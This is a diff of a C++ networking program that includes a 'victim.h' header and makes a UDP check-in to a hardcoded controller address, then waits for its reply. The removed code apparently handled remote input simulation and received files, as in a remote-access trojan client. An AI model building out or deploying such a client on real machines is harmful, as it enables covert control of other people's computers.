@@ -1,31 +1,32 @@
 #include <SFML/Network.hpp>
-#include <fstream>
 #include <iostream>
-#include <windows.h>
-#include <thread>
-#include <chrono>
+#include "victim.h"
 
-std::string takeInfo(bool& erase);
-void simulate(sf::Int16 cmd, bool info);
-void fixMouse(sf::Vector2f& pos, bool& isFixed);
-void saveFile(sf::Packet packet, std::string extention);
+#define SERVER_IP "10.0.1.32"
+#define SERVER_PORT 2390
 
 int main()
 {
     sf::UdpSocket ard;
-    char data[] = "mamma";
-    ard.bind(5000);
-    ard.send(data, 5, "10.0.1.32", 2390);
-    char buf[100];
+    ard.send("v", 1, SERVER_IP, SERVER_PORT);
+
+    connect:
     size_t size;
     sf::IpAddress ip;
     unsigned short port;
-    ard.receive(buf, 100, size, ip, port);
-    for (int i = 0; i < size; i++)
-        std::cout << buf[i];
+    ard.bind(sf::Socket::AnyPort);
+    char buf[1];
+    ard.receive(buf, sizeof(buf), size, ip, port);
+
+    if (ip != SERVER_IP || size != 1)
+        goto connect;
+
+
 
     return 0;
+}
 
+/*{
     sf::Vector2f screenDim;
     sf::Vector2f mousePos = sf::Vector2f(0, 0);
     bool isMouseFixed = false;
@@ -290,4 +291,4 @@ void saveFile(sf::Packet packet, std::string extention)
         receivedFile.write(&fileData[0], fileData.size());
         receivedFile.close();        
     }
-}
+}*/
